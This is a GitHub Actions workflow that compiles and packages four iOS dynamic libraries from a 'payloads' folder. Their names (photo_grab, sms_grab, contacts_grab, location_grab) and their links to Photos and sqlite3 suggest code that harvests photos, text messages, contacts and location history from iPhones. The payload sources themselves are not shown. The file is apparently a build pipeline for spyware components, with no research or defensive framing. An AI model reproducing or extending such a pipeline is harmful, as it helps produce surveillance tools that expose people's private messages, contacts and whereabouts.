name: Build All Grab Dylibs

on:
  push:
    paths:
      - 'payloads/*_grab.c'
      - '.github/workflows/build.yml'
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4

      - name: Compile photo_grab.dylib
        run: |
          cp payloads/photo_grab.c p.m
          xcrun --sdk iphoneos clang -arch arm64 -dynamiclib -fobjc-arc \
            -mios-version-min=14.0 -Wno-deprecated-declarations -Wno-error \
            -framework Foundation -framework Photos -framework UIKit \
            -o payloads/photo_grab.dylib p.m
          file payloads/photo_grab.dylib && ls -lh payloads/photo_grab.dylib

      - name: Compile sms_grab.dylib
        run: |
          cp payloads/sms_grab.c s.m
          xcrun --sdk iphoneos clang -arch arm64 -dynamiclib -fobjc-arc \
            -mios-version-min=14.0 -Wno-deprecated-declarations -Wno-error \
            -framework Foundation -lsqlite3 \
            -o payloads/sms_grab.dylib s.m
          file payloads/sms_grab.dylib && ls -lh payloads/sms_grab.dylib

      - name: Compile contacts_grab.dylib
        run: |
          cp payloads/contacts_grab.c c.m
          xcrun --sdk iphoneos clang -arch arm64 -dynamiclib -fobjc-arc \
            -mios-version-min=14.0 -Wno-deprecated-declarations -Wno-error \
            -framework Foundation -lsqlite3 \
            -o payloads/contacts_grab.dylib c.m
          file payloads/contacts_grab.dylib && ls -lh payloads/contacts_grab.dylib

      - name: Compile location_grab.dylib
        run: |
          cp payloads/location_grab.c l.m
          xcrun --sdk iphoneos clang -arch arm64 -dynamiclib -fobjc-arc \
            -mios-version-min=14.0 -Wno-deprecated-declarations -Wno-error \
            -framework Foundation -lsqlite3 \
            -o payloads/location_grab.dylib l.m
          file payloads/location_grab.dylib && ls -lh payloads/location_grab.dylib

      - uses: actions/upload-artifact@v4
        with:
          name: grab-dylibs
          path: |
            payloads/photo_grab.dylib
            payloads/sms_grab.dylib
            payloads/contacts_grab.dylib
            payloads/location_grab.dylib
          retention-days: 90
